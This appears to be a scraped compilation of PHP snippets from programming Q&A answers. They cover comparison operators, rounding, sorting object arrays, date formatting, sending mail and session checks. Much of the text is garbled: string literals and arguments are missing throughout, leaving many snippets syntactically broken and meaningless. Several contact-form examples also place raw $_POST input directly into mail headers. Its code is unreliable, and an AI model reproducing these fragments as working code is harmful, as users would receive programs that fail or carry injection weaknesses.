$arr = array("name"); if (!array_search("name", $arr))
$attributeFromArray = ""; if ($attributeFromArray == ""){} if ($attributeFromArray === ""){} if ($attributeFromArray == null){} if ($attributeFromArray === null){} $attributeFromArray = null; if ($attributeFromArray == ""){} if ($attributeFromArray === ""){} if ($attributeFromArray == null){} if ($attributeFromArray === null){}
var_dump(5 == 5); var_dump(5 == "5"); var_dump(5 === 5); var_dump(5 === "5");
$a = 5; var_dump($a == 5); var_dump($a == var_dump($a === 5); var_dump($a ===
$needle = $haystack = $pos = strpos($haystack, $needle); if ($pos === false) { echo $needle . } else { echo $needle . }
if(myFunction() == false) { ... error on myFunction ... }
if(myFunction() === false) { ... error on myFunction ... }
<?php /** * Comparison of two PHP objects == === * Checks for * 1. References yes yes * 2. Instances with matching attributes and its values yes no * 3. Instances with different attributes yes no **/ // class Foo { public $foobar = 1; public function createNewProperty($name, $value) { $this->{$name} = $value; } } class Bar { } // echo "1. Object handles or references (both == and ===) <br />"; $bar = new Foo(); $bar2 = new Foo(); $baz = clone $bar; $qux = $bar; $norf = new Bar(); echo "bar"; var_dump($bar); echo "baz"; var_dump($baz); echo "qux"; var_dump($qux); echo "bar2"; var_dump($bar2); echo "norf"; var_dump($norf); echo var_dump($bar == $bar2); echo var_dump($bar === $bar2); echo var_dump($bar == $baz); echo var_dump($bar === $baz); echo var_dump($bar == $qux); echo var_dump($bar === $qux); echo var_dump($bar == $norf); echo var_dump($bar === $norf); echo "2. Instances with matching attributes and its values (only ==) <br />"; $baz->foobar = 2; echo echo echo echo var_dump($bar == $baz); $baz->foobar = 1; echo echo echo echo var_dump($bar == $baz); $qux->foobar = 2; echo echo echo echo var_dump($bar == $qux); echo "3. Instances with different attributes (only ==) <br />"; $name = $value = null; $baz->createNewProperty($name, $value); echo var_dump($baz); $baz->foobar = 2; echo echo echo echo var_dump($bar == $baz); var_dump($bar); var_dump($baz); ?>
$arr = []; $arr["I"] = "we"; $arr["you"] = "you"; $arr["he"] = "they";
$alphabetArr = []; $alphabetArr["I"] = "we"; $alphabetArr["he"] = "they"; $alphabetArr["you"] = "you";
$stdClass1 = new stdClass(); $stdClass2 = new stdClass(); $clonedStdClass1 = clone $stdClass1; $stdClass1 == $stdClass2; $stdClass1 === $stdClass2; $stdClass1 == $clonedStdClass1; $stdClass1 === $clonedStdClass1;
$number = "520"; $formatted_number = round_to_2dp($number); echo $formatted_number;
float round ( float $val [, int $precision = 0 [, int $mode = PHP_ROUND_HALF_UP ]] );
<?php echo round(3.4); echo round(3.5); echo round(3.6); echo round(3.6, 0); echo round(1.95583, 2); echo round(1241757, -3); echo round(5.045, 2); echo round(5.055, 2); ?>
<?php echo round(9.5, 0, PHP_ROUND_HALF_UP); echo round(9.5, 0, PHP_ROUND_HALF_DOWN); echo round(9.5, 0, PHP_ROUND_HALF_EVEN); echo round(9.5, 0, PHP_ROUND_HALF_ODD); echo round(8.5, 0, PHP_ROUND_HALF_UP); echo round(8.5, 0, PHP_ROUND_HALF_DOWN); echo round(8.5, 0, PHP_ROUND_HALF_EVEN); echo round(8.5, 0, PHP_ROUND_HALF_ODD); ?>
$number = 1234545454; echo $english_format_number = number_format($number, 2);
$decimals = 2; $number = 221.12345; $number = $number * pow(10,$decimals); $number = intval($number); $number = $number / pow(10,$decimals);
$somenumber = 123.56; $somenumber = round($somenumber,2); if($somenumber == intval($somenumber)) { $somenumber = intval($somenumber); } echo $somenumber; $somenumber = 123.00; $somenumber = round($somenumber,2); if($somenumber == intval($somenumber)) { $somenumber = intval($somenumber); } echo $somenumber;
$retailPrice = 5.989; echo number_format(floor($retailPrice*100)/100,2,
function truncate_number( $number, $precision = 2) { if ( 0 == (int)$number ) { return $number; } $negative = $number / abs($number); $number = abs($number); $precision = pow(10, $precision); return floor( $number * $precision ) / $precision * $negative; }
echo truncate_number(2.56789, 1); echo truncate_number(2.56789); echo truncate_number(2.56789, 3); echo truncate_number(-2.56789, 1); echo truncate_number(-2.56789); echo truncate_number(-2.56789, 3);
echo bcdiv(2.56789, 1, 1); echo bcdiv(2.56789, 1, 2); echo bcdiv(2.56789, 1, 3); echo bcdiv(-2.56789, 1, 1); echo bcdiv(-2.56789, 1, 2); echo bcdiv(-2.56789, 1, 3);
echo round(3.4); echo round(3.5); echo round(3.6); echo round(3.6, 0); echo round(1.95583, 2); echo round(1241757, -3); echo round(5.045, 2); echo round(5.055, 2);
Array ( [0] => stdClass Object ( [ID] => 1 [name] => Mary Jane [count] => 420 ) [1] => stdClass Object ( [ID] => 2 [name] => Johnny [count] => 234 ) [2] => stdClass Object ( [ID] => 3 [name] => Kathy [count] => 4354 ) ....
function cmp($a, $b) { return strcmp($a->name, $b->name); } usort($your_data, "cmp");
usort($your_data, function($a, $b) { return strcmp($a->name, $b->name); });
public static function cmp($a, $b) { return strcmp($a->name, $b->name); } usort($your_data, array(
usort($array,function($first,$second){ return $first->number < $second->number; }); usort($array,function($first,$second){ return $first->number > $second->number; });
usort($array,function($first,$second){ return strtolower($first->text) < strtolower($second->text); }); usort($array,function($first,$second){ return strtolower($first->text) > strtolower($second->text); });
usort($array, var_dump($array); function my_sort_function($a, $b) { return $a->name < $b->name; }
function sortArrayByKey(&$array,$key,$string = false,$asc = true){ if($string){ usort($array,function ($a, $b) use(&$key,&$asc) { if($asc) return strcmp(strtolower($a{$key}), strtolower($b{$key})); else return strcmp(strtolower($b{$key}), strtolower($a{$key})); }); }else{ usort($array,function ($a, $b) use(&$key,&$asc) { if($a[$key] == $b{$key}){return 0;} if($asc) return ($a{$key} < $b{$key}) ? -1 : 1; else return ($a{$key} > $b{$key}) ? -1 : 1; }); } }
sortArrayByKey($yourArray,"name",true); sortArrayByKey($yourArray,"name",true,false); sortArrayByKey($yourArray,"id"); sortArrayByKey($yourArray,"count",false,false);
usort($array,function($first,$second){ return strcmp($first->name, $second->name); });
class CustomSort{ public $field = public function cmp($a, $b) { /** * field for order is in a class variable $field * using getter function with naming convention getVariable() we set first letter to uppercase * we use variable variable names - $a->{ */ return strcmp($a->{ } public function sortObjectArrayByField($array, $field) { $this->field = $field; usort($array, array("Your\Namespace\CustomSort", "cmp"));; return $array; } }
$names = array(); foreach ($my_array as $my_object) { $names[] = $my_object->name; } array_multisort($names, SORT_ASC, $my_array); return $my_array;
usort($your_data,function($a,$b){ setlocale (LC_COLLATE, return strcoll($a->name,$b->name); });
usort($jobs, array($this->job_model, "sortJobs")); usort($jobs, array($this, "sortJobs"));
usort($listable_products, function($a, $b) { global $translator; return strcmp($a->getFullTitle($translator), $b->getFullTitle($translator)); });
$order_by = usort($your_data, function ($a, $b) use ($order_by) { return strcmp($a->{$order_by}, $b->{$order_by}); });
return array_values(array_sort($array, function ($value) { return $value->key; }));
$sortedByName = from($objects)->orderBy( $sortedByCount = from($objects)->orderBy( $sortedByCountAndName = from($objects)->orderBy(
use function \nspl\a\sorted; use function \nspl\op\propertyGetter; use function \nspl\op\methodCaller; $sortedByCount = sorted($objects, propertyGetter( $sortedByName = sorted($objects, methodCaller(
usort($threads,function($first,$second){ return strtotime($first->dateandtime) < strtotime($second->dateandtime); });
class Util { public static function sortArrayByName(&$arrayToSort, $meta) { usort($arrayToSort, function($a, $b) use ($meta) { return strcmp($a[$meta], $b[$meta]); }); } }
Util::sortArrayByName($array, "array_property_name");
rjha@mint ~ $ ~/sw/pfff/scheck ~/code/github/sc/ login-now.php:7:4: CHECK: Unused Local variable $title go-automatic.php:14:77: CHECK: Use of undeclared variable $goUrl.
php_value upload_max_filesize 40M php_value post_max_size 42M
<IfModule mod_php5.c> php_value upload_max_filesize 40M php_value post_max_size 40M </IfModule>
php_value memory_limit 256M php_value post_max_size 256M php_value upload_max_filesize 64M php_value max_input_vars 1800 php_value max_execution_time 300 php_value max_input_time 300
post_max_size=500M upload_max_filesize=500M memory_limit=900M
class A { public static function get_self() { return new self(); } public static function get_static() { return new static(); } } class B extends A {} echo get_class(B::get_self()); echo get_class(B::get_static()); echo get_class(A::get_self()); echo get_class(A::get_static());
class A { public function create1() { $class = get_class($this); return new $class(); } public function create2() { return new static(); } } class B extends A { } $b = new B(); var_dump(get_class($b->create1()), get_class($b->create2()));
class Foo { public $name = static::class; } $Foo = new Foo; echo $Foo->name;
class Foo { public $name = self::class; } $Foo = new Foo; echo $Foo->name;
a b c d e f g h i j k l m n o p q r s t u v w x y z
$alphas = range( foreach($alphas as $value){ echo $value."<br>"; }
<?php $i = do { echo ($j=$i++),"\r\n"; } while (ord($j) < ord($i)); ?>
<?php $ascii_val = ord("a"); for($i=$ascii_val;$i<$ascii_val+26;$i++){ echo chr($i)."\n"; } ?>
<?php for ($i = "a"; $i = "y"; $i++) { echo "$i\n"; if ($i == "z") {} } echo "z"; ?>
$var = 5; echo "I echo "I $items = (string)$var; $items = strval($var);
$int = 5; $int_as_string = (string) $int; echo $int . echo $int_as_string .
$int = 5; echo $int . $int_as_string = "$int"; echo $int_as_string . $string_int = $int. echo $int_as_string .
$int = 5; echo $int . $int_as_string = trim($int); echo $int_as_string .
$input => 123 sprintf( (string)$input => 123 strval($input) => 123 settype($input, "string") => 123
$i = 0; $len = count($array); foreach ($array as $item) { if ($i == 0) { } else if ($i == $len - 1) { } $i++; }
foreach($array as $key => $element) { if ($key === array_key_first($array)) echo if ($key === array_key_last($array)) echo }
foreach($array as $key => $element) { reset($array); if ($key === key($array)) echo end($array); if ($key === key($array)) echo }
foreach( $items as $item ) { if( !next( $items ) ) { echo } }
$len = count($array); foreach ($array as $index => $item) { if ($index == 0) { } else if ($index == $len - 1) { } }
$len = count($array); foreach ($array as $index => $item) { if ($index == 0) { continue; } if ($index == $len - 1) { continue; } }
<?php $array = something(); $first = array_shift($array); $last = array_pop($array); foreach ($array as $item) { } ?>
<?php function create_menu($params) { $collection = get( foreach($collection as $c) show_collection($c); } function show_subcat($val) { ?> <div class="sub_node" style="display:none"> <img src="../images/dtree/join.gif" align="absmiddle" style="padding-left:2px;" /> <a id=" <?php echo $val[ </a> </div> <?php } function show_cat($item) { ?> <div class="node" > <img src="../images/dtree/plus.gif" align="absmiddle" class="node_item" id="plus" /> <img src="../images/dtree/folder.gif" align="absmiddle" id="folder"> <?php echo $item[ <?php $subcat = get_where( foreach($subcat as $val) show_subcat($val); ?> </div> <?php } function show_collection($c) { ?> <div class="parent" style="direction:rtl"> <img src="../images/dtree/minus.gif" align="absmiddle" class="parent_item" id="minus" /> <img src="../images/dtree/base.gif" align="absmiddle" id="base"> <?php echo $c[ <?php $cat = get_where( foreach($cat as $item) show_cat($item); ?> </div> <?php } ?>
$first = true; foreach ( $obj as $value ) { if ( $first ) { $first = false; } else { } }
end($array); $lastkey = key($array); foreach($array as $key => $element) { ....do array stuff if ($lastkey === key($array)) echo }
$array = array( ... ); $count = count( $array ); for ( $i = 0; $i < $count; $i++ ) { $current = $array[ $i ]; if ( $i == 0 ) { } if ( $i == $count - 1 ) { } }
$arr = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10); foreach ($arr as $a) { if (!each($arr)) echo "End!\n"; echo $a."\n"; }
$keys = array_keys($arr); $numItems = count($keys); $i=0; $firstItem=$arr[$keys[0]]; $i++; while($i<$numItems-1){ $item=$arr[$keys[$i]]; $i++; } $lastItem=$arr[$keys[$i]]; $i++;
$numItems = count($arr); $i=0; $firstitem=$arr[0]; $i++; while($i<$numItems-1){ $some_item=$arr[$i]; $i++; } $last_item=$arr[$i]; $i++;
foreach ($array as $key => $value) { if ($value === end($array)) { echo "LAST ELEMENT!"; } }
$is_first = true; foreach( $array as $value ) { switch ( $value ) { case echo if ( $is_first ) { echo $is_first = false; } break; } } if( !next( $array ) ) { echo } }
$len = count( $array ); for ( $i = 0; $i < $len; $i++ ) { $value = $array[$i]; if ($i === 0) { } elseif ( $i === $len - 1 ) { } $i++; }
$firstElement = true; foreach ($reportData->result() as $row) { if($firstElement) { echo "first element"; $firstElement=false; } }
<?php foreach_first_last(array(), function ($key, $value, $step, $first, $last) { echo intval($first), }); foreach_first_last(array( echo intval($first), }); echo PHP_EOL; foreach_first_last(array( echo intval($first), }); echo PHP_EOL; function foreach_first_last($array, $cb) { $next = false; $current = false; reset($array); for ($step = 0; true; ++$step) { $current = $next; $next = each($array); $last = ($next === false || $next === null); if ($step > 0) { $first = $step == 1; list ($key, $value) = $current; if (call_user_func($cb, $key, $value, $step, $first, $last) === false) { break; } } if ($last) { break; } } }
$indexOfLastElement = count($array) - 1; array_walk($array, function($element, $index) use ($indexOfLastElement) { if (0 === $index) { } if ($indexOfLastElement === $index) { } });
foreach($array as $value) { if ($value === reset($array)) { echo } if ($value === end($array)) { echo } }
function children( &$parents, $parent, $selected ){ if ($parents[$parent]){ $list = $counter = count($parents[$parent]); $class = array( foreach ($parents[$parent] as $child){ if ($child[ if (!--$counter) $class[] = $list .= $class = array(); $list .= children($parents, $child[ } $list .= return $list; } } $output .= children( $parents, 0, $p_industry_id);
<script type="text/javascript"> var foo = <?php file_put_contents( ?> var baz = <?php echo 42; ?>; alert(baz); </script>
<script type="text/javascript"> var foo = <?php file_put_contents( ?> var baz = <?php echo 42; ?>; alert(baz); </script>
<script type="text/javascript"> var foo = var baz = 42; alert(baz); </script>
Fatal error: Cannot use object of type stdClass as array in C:\Users\Dail\software\abs.php on line 108
mixed json_decode ( string $json [, bool $assoc = false [, int $depth = 512 [, int $options = 0 ]]] )
class DB { private static $_instance = null; private $_pdo, $_query, $_error = false, $_results, $_count = 0; private function __construct() { try{ $this->_pdo = new PDO( } catch(PDOException $e) { $this->_error = true; $newsMessage = $pagetitle = $pagedescription = include_once exit; } $headerinc = } public static function getInstance() { if(!isset(self::$_instance)) { self::$_instance = new DB(); } return self::$_instance; } public function query($sql, $params = array()) { $this->_error = false; if($this->_query = $this->_pdo->prepare($sql)) { $x = 1; if(count($params)) { foreach($params as $param){ $this->_query->bindValue($x, $param); $x++; } } } if($this->_query->execute()) { $this->_results = $this->_query->fetchAll(PDO::FETCH_OBJ); $this->_count = $this->_query->rowCount(); } else{ $this->_error = true; } return $this; } public function action($action, $table, $where = array()) { if(count($where) ===3) { $operators = array( $field = $where[0]; $operator = $where[1]; $value = $where[2]; if(in_array($operator, $operators)) { $sql = "{$action} FROM {$table} WHERE {$field} = ?"; if(!$this->query($sql, array($value))->error()) { return $this; } } } return false; } public function get($table, $where) { return $this->action( public function results() { return $this->_results; } public function first() { return $this->_results[0]; } public function count() { return $this->_count; } }
<?php $pagetitle = $pagedescription = require_once $_SERVER[ $newsMessage = $servicecallsdb = DB::getInstance()->get( if(!$servicecallsdb) { } else { $servicecalls = $servicecallsdb->results(); } include ?>
<?php include $_SERVER[ <!--Main content--> <div id="mainholder"> <!-- div so that page footer can have a minum height from the header --> <h1><?php if(isset($pagetitle)) htmlout($pagetitle);?></h1> <br> <br> <article> <h2></h2> </article> <?php if (isset($servicecalls)) { if (count ($servicecalls) > 0){ foreach ($servicecalls as $servicecall) { echo .$servicecall->ServiceCallDescription . } }else echo } ?> <a href="/servicecalls/?new=true">Raise New Service Call</a> </div> <!-- Main content end--> <?php include $_SERVER[
$response = (new FacebookRequest( FacebookSession::newAppSession($this->appId, $this->appSecret), $params ))->execute()->getResponse(true); if (isset($response[ return new FacebookSession($response[ }
$response = (array) (new FacebookRequest( FacebookSession::newAppSession($this->appId, $this->appSecret), $params ))->execute()->getResponse(true);
function getDatetimeNow() { $tz_object = new DateTimeZone( $datetime = new DateTime(); $datetime->setTimezone($tz_object); return $datetime->format( }
$now = date_create( $now = date_create()->format( $now = new DateTime( $now = (new DateTime( $now = date(
Variable_name Value date_format %Y-%m-%d datetime_format %Y-%m-%d %H:%i:%
$dtz = new DateTimeZone("Europe/Madrid"); $now = new DateTime(date("Y-m-d"), $dtz); echo $now->format("Y-m-d H:i:s");
date_default_timezone_set( $importedDate = new \DateTime( echo $importedDate->format( $importedDate->setTimezone(new \DateTimeZone("America/New_York")); echo $importedDate->format(
ATOM = "Y-m-d\TH:i:sP" ; COOKIE = "l, d-M-Y H:i:s T" ; ISO8601 = "Y-m-d\TH:i:sO" ; RFC822 = "D, d M y H:i:s O" ; RFC850 = "l, d-M-y H:i:s T" ; RFC1036 = "D, d M y H:i:s O" ; RFC1123 = "D, d M Y H:i:s O" ; RFC2822 = "D, d M Y H:i:s O" ; RFC3339 = "Y-m-d\TH:i:sP" ; RFC3339_EXTENDED = "Y-m-d\TH:i:s.vP" ; RSS = "D, d M Y H:i:s O" ; W3C = "Y-m-d\TH:i:sP" ;
function DateStamp($strDateTime = null, $strTimeZone = "Europe/London") { $objTimeZone = new DateTimeZone($strTimeZone); $objDateTime = new DateTime(); $objDateTime->setTimezone($objTimeZone); if (!empty($strDateTime)) { $fltUnixTime = (is_string($strDateTime)) ? strtotime($strDateTime) : $strDateTime; if (method_exists($objDateTime, "setTimestamp")) { $objDateTime->setTimestamp($fltUnixTime); } else { $arrDate = getdate($fltUnixTime); $objDateTime->setDate($arrDate[ $objDateTime->setTime($arrDate[ } } return $objDateTime->format("Y-m-d H:i:s"); }
$originalDate = "2010-03-21"; $newDate = date("d-m-Y", strtotime($originalDate));
$myDateTime = DateTime::createFromFormat( $newDateString = $myDateTime->format(
$newDateString = date_format(date_create_from_format(
<?php $source = $date = new DateTime($source); echo $date->format( echo $date->format( ?>
$newDate = preg_replace("/(\d+)\D+(\d+)\D+(\d+)/","$3-$2-$1",$originalDate);
$timestamp = strtotime(your date variable); $new_date = date(
function Date_Converter($date, $locale = "br") { if (is_null($date)) $date = date("m/d/Y H:i:s"); if ($locale == "unix") $date = date("m/d/Y H:i:s", $date); $date = explode(" ", $date); if ($locale == "br") { $date[0] = explode("/", $date[0]); $date[0] = $date[0][1] . "/" . $date[0][0] . "/" . $date[0][2]; } $Return["datetime"]["us"] = implode(" ", $date); $Return["date"]["us"] = $date[0]; $Return["time"] = $date[1]; $Return["unix_datetime"] = strtotime($Return["datetime"]["us"]); $Return["unix_date"] = strtotime($Return["date"]["us"]); $Return["getdate"] = getdate($Return["unix_datetime"]); $Return["datetime"]["br"] = date("d/m/Y H:i:s", $Return["unix_datetime"]); $Return["date"]["br"] = date("d/m/Y", $Return["unix_date"]); return $Return; }
$cls_date = new DateTime($date); echo $cls_date->format(
function reformatDate($date, $from_format = $date_aux = date_create_from_format($from_format, $date); return date_format($date_aux,$to_format); }
$tomorrow = mktime(0, 0, 0, date("m"), date("d") + 1, date("Y")); echo date("d", $tomorrow) . "/" . date("m", $tomorrow). "/" . date("Y", $tomorrow);
<?php $name = $_POST[ $email = $_POST[ $message = $_POST[ $from = $to = $subject = $body = "From: $name\n E-Mail: $email\n Message:\n $message"; if ($_POST[ if (mail ($to, $subject, $body, $from)) { echo } else { echo } } ?>
error_reporting(-1); ini_set( set_error_handler("var_dump");
$headers = array("From: from@example.com", "Reply-To: replyto@example.com", "X-Mailer: PHP/" . PHP_VERSION ); $headers = implode("\r\n", $headers); mail($to, $subject, $message, $headers);
$headers = array("From from@example.com", "Reply To: replyto@example.com", "X-Mailer: "PHP"/" . PHP_VERSION );
$to = mail($recipient, $subject, $message, $headers);
ini_set("mail.log", "/tmp/mail.log"); ini_set("mail.add_x_header", TRUE);
$header = "From: noreply@example.com\r\n"; $header.= "MIME-Version: 1.0\r\n"; $header.= "Content-Type: text/html; charset=ISO-8859-1\r\n"; $header.= "X-Priority: 1\r\n"; $status = mail($to, $subject, $message, $header); if($status) { echo } else { echo }
function send_mail($email, $recipient_name, $message= { require("phpmailer/class.phpmailer.php"); $mail = new PHPMailer(); $mail->CharSet="utf-8"; $mail->IsSMTP(); $mail->Host = "mail.example.com"; $mail->SMTPAuth = true; $mail->Username = "myusername"; $mail->Password = "p@ssw0rd"; $mail->From = "me@walalang.com"; $mail->FromName = "System-Ad"; $mail->AddAddress($email, $recipient_name); $mail->WordWrap = 50; $mail->IsHTML(true); $mail->Subject = "This is a Sampleenter code here Email"; $mail->Body = $message; $mail->AltBody = "This is the body in plain text for non-HTML mail clients"; $mail->AddEmbeddedImage( $mail->addAttachment( if(!$mail->Send()) { echo "Message could not be sent. <p>"; echo "Mailer Error: " . $mail->ErrorInfo; exit; } echo "Message has been sent"; }
<?php $name = $_POST[ $email = $_POST[ $message = $_POST[ $from = $to = $subject = $body = "From: $name\n E-Mail: $email\n Message:\n $message"; $headers .= "MIME-Version: 1.0\r\n"; $headers .= "Content-type: text/html\r\n"; $headers .= mail($to, $subject, $message, $headers);
$headers = "MIME-Version: 1.0" . "\r\n"; $headers .= "Content-type: text/html; charset=iso-8859-1" . "\r\n"; $headers .= "From: ". $from. "\r\n"; $headers .= "Reply-To: ". $from. "\r\n"; $headers .= "X-Mailer: PHP/" . phpversion(); $headers .= "X-Priority: 1" . "\r\n";
<?php $SmtpServer="smtp.*.*"; $SmtpPort="2525"; $SmtpUser="***"; $SmtpPass="***"; ?>
<?php class SMTPClient { function SMTPClient ($SmtpServer, $SmtpPort, $SmtpUser, $SmtpPass, $from, $to, $subject, $body) { $this->SmtpServer = $SmtpServer; $this->SmtpUser = base64_encode ($SmtpUser); $this->SmtpPass = base64_encode ($SmtpPass); $this->from = $from; $this->to = $to; $this->subject = $subject; $this->body = $body; if ($SmtpPort == "") { $this->PortSMTP = 25; } else { $this->PortSMTP = $SmtpPort; } } function SendMail () { $newLine = "\r\n"; $headers = "MIME-Version: 1.0" . $newLine; $headers .= "Content-type: text/html; charset=iso-8859-1" . $newLine; if ($SMTPIN = fsockopen ($this->SmtpServer, $this->PortSMTP)) { fputs ($SMTPIN, "EHLO ".$HTTP_HOST."\r\n"); $talk["hello"] = fgets ( $SMTPIN, 1024 ); fputs($SMTPIN, "auth login\r\n"); $talk["res"]=fgets($SMTPIN,1024); fputs($SMTPIN, $this->SmtpUser."\r\n"); $talk["user"]=fgets($SMTPIN,1024); fputs($SMTPIN, $this->SmtpPass."\r\n"); $talk["pass"]=fgets($SMTPIN,256); fputs ($SMTPIN, "MAIL FROM: <".$this->from.">\r\n"); $talk["From"] = fgets ( $SMTPIN, 1024 ); fputs ($SMTPIN, "RCPT TO: <".$this->to.">\r\n"); $talk["To"] = fgets ($SMTPIN, 1024); fputs($SMTPIN, "DATA\r\n"); $talk["data"]=fgets( $SMTPIN,1024 ); fputs($SMTPIN, "To: <".$this->to.">\r\nFrom: <".$this->from.">\r\n".$headers."\n\nSubject:".$this->subject."\r\n\r\n\r\n".$this->body."\r\n.\r\n"); $talk["send"]=fgets($SMTPIN,256); fputs ($SMTPIN, "QUIT\r\n"); fclose($SMTPIN); } return $talk; } } ?>
<?php include( include( if($_SERVER["REQUEST_METHOD"] == "POST") { $to = ""; $from = $_POST[ $subject = "Enquiry"; $body = $_POST[ $SMTPMail = new SMTPClient ($SmtpServer, $SmtpPort, $SmtpUser, $SmtpPass, $from, $to, $subject, $body); $SMTPChat = $SMTPMail->SendMail(); } ?>
<?php $name = $_POST[ $email = $_POST[ $message = $_POST[ $from = $to = $subject = $body = "From:" .$name."\r\n E-Mail:" .$email."\r\n Message:\r\n" .$message; if (isset($_POST[ { if (mail ($to, $subject, $body, $from)) { echo } else { echo } } ?>
$config = Array( ); $message = $this->load->library( $this->email->from( $this->email->to( $this->email->subject( $this->email->message($message); if($this->email->send()) { }
$name = $_POST[ $email = $_POST[ $reciver = if (filter_var($reciver, FILTER_VALIDATE_EMAIL)) { $subject = $name; $headers = $headers .= $headers .= $template = . . . . . $sendmessage = "<div style=\"background-color: $sendmessage = wordwrap($sendmessage, 70); mail($reciver, $subject, $sendmessage, $headers); echo "Your Query has been received, We will contact you soon."; } else { echo "<span>* invalid email *</span>"; }
<?php $to = "somebody@example.com, somebodyelse@example.com"; $subject = "HTML email"; $message = " <html> <head> <title>HTML email</title> </head> <body> <p>This email contains HTML Tags!</p> <table> <tr> <th>Firstname</th> <th>Lastname</th> </tr> <tr> <td>John</td> <td>Doe</td> </tr> </table> </body> </html>"; $headers = "MIME-Version: 1.0" . "\r\n"; $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; $headers .= $headers .= mail($to,$subject,$message,$headers); ?>
if ($_POST[ $success= mail($to, $subject, $body, $from); if($success) { echo ' <p>Your message has been sent!</p> } else { echo ' <p>Something went wrong, go back and try again!</p> } }
require $message = Swift_Message::newInstance() ->setSubject( ->setFrom(array( ->setTo(array( ->setBody( if (Swift_Mailer::newInstance(Swift_MailTransport::newInstance())->send($message)) { echo json_encode([ "status" => "OK", "message" => ], JSON_PRETTY_PRINT); } else { echo json_encode([ "status" => "error", "message" => ], JSON_PRETTY_PRINT); }
require_once require_once require_once $mail = new \PHPMailer\PHPMailer\PHPMailer(true); try { $mail->SMTPDebug = 0; $mail->isSMTP(); $mail->Host = $mail->SMTPAuth = true; $mail->Username = $mail->Password = $mail->SMTPSecure = $mail->Port = 465; $mail->setFrom( $mail->addAddress( $mail->addAttachment( $mail->isHTML(true); $mail->Subject = utf8_decode("subject"); $mail->Body = utf8_decode("mail content"); $mail->AltBody = $mail->send(); } catch (Exception $e){ $error = $mail->ErrorInfo; }
From: myapp@example.com To: mymail@example.com Subject: Test mail via sendmail. Text body.
root=mymail@example.com mailhub=smtp.yandex.ru:465 FromLineOverride=YES UseTLS=YES AuthUser=abcde@yandex.ru AuthPass=password
$name = $_POST[ $email = $_POST[ $message = $_POST[ $from = $to = $subject = $body = "From: $name\n E-Mail: $email\n Message:\n $message";
<?php error_reporting(0); $name = $_POST[ $email = $_POST[ $message = $_POST[ $from = $to = $subject = $body = "From: $name\n E-Mail: $email\n Message:\n $message"; if ($_POST[ if (!(empty($_POST[ if (!(empty($_POST[ if (!(empty($_POST[ mail ($to, $subject, $body, $from); echo }else{ echo }else { echo }else{ echo }else{ echo ?>
<html> <form method="post" action="?"> <table> <tr><td>Name</td><td><input type= <tr><td>Email</td><td><input type= <tr><td>Message</td><td><input type= <tr><td></td><td><input type= </table> </form> </html>
<?php $to = $subject = $message = $headers = mail($to, $subject, $message, $headers); ?>
include "libmail.php"; $m = new Mail(); $m->From( $_POST[ $m->To( $_POST[ $m->Subject( $_POST[ $m->Body( $_POST[ $m->Cc( $_POST[ $m->Priority(4); $m->Attach( "/home/leo/toto.gif", "image/gif", "inline" ); $m->Send(); echo "Mail was sent:" echo $m->Get();
<?php use PHPMailer\PHPMailer\PHPMailer; require require require $name=$_POST[ $mailid=$_POST[ $mail = new PHPMailer; $mail->IsSMTP(); $mail->SMTPDebug = 0; $mail->Host = $mail->Port = 587; $mail->SMTPAuth = true; $mail->Username = $mail->Password = $mail->SMTPSecure = $mail->From = $mail->FromName = $mail->AddAddress($mailid,$name); $mail->IsHTML(true); $mail->Subject = $mail->Body = $mail->AltBody = if(!$mail->Send()) { echo echo exit; } echo ?>
if(!isset($_COOKIE["PHPSESSID"])) { session_start(); }
if (session_status() == PHP_SESSION_NONE) { session_start(); }
session_id( var_export(session_id() != var_export(session_status() == PHP_SESSION_ACTIVE);
if (version_compare(phpversion(), if(session_id() == session_start(); } } else { if (session_status() == PHP_SESSION_NONE) { session_start(); } }
var_dump($_SESSION); session_start(); var_dump($_SESSION); session_destroy(); var_dump($_SESSION);
session_id(); session_start(); session_id(); session_destroy(); session_id(); session_id( session_id();
if ((function_exists( && session_status() !== PHP_SESSION_ACTIVE) || !session_id()) { session_start(); }
<?php /** * @return bool */ function is_session_started() { if ( php_sapi_name() !== if ( version_compare(phpversion(), return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE; } else { return session_id() === } } return FALSE; } if ( is_session_started() === FALSE ) session_start(); ?>
function start_session() { if(version_compare(phpversion(), "5.4.0") != -1){ if (session_status() == PHP_SESSION_NONE) { session_start(); } } else { if(session_id() == session_start(); } } }
<?php if(!isset($_SESSION)) { session_start(); } ?>
/** * Start session * Fall back to ukrainian language */ function valid_session() { if(session_id()== session_start(); $_SESSION[ $_SESSION[ } return true; }
if(!strlen(session_id())){ session_name( session_start(); }
if (!defined( $version = explode( define( // // // if (PHP_VERSION_ID < 50207) { define( define( define( } } function phpVersionAtLeast($strVersion = { $version = explode( $questionVer = $version[0] * 10000 + $version[1] * 100 + $version[2]; if(PHP_VERSION_ID >= $questionVer) return true; else return false; } function openSession() { if(phpVersionAtLeast( { if(session_status()==PHP_SESSION_NONE) session_start(); } else { if(session_id() == session_start(); } }
if (version_compare(PHP_VERSION, "5.4.0") >= 0) { $sess = session_status(); if ($sess == PHP_SESSION_NONE) { session_start(); } } else { if (!$_SESSION) { session_start(); } }
session_start(); if(!empty($_SESSION[ { } else { header("location:index.php"); }
if (!defined( $version = explode( define( }else{ $version = PHP_VERSION_ID; } if($version < 50400){ if(session_id() == session_start(); } }else{ if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); } }
if(session_status() !== PHP_SESSION_ACTIVE){session_start();}; if(session_status() !== PHP_SESSION_ACTIVE){die(
if(session_id()== { echo"Session isn } else { echo"Session Started"; }
if (empty($_SESSION) && !isset($_SESSION)) { session_start(); }
if (!isset($a)) { a = False; if ($a == TRUE) { session_start(); $a = TRUE; } }
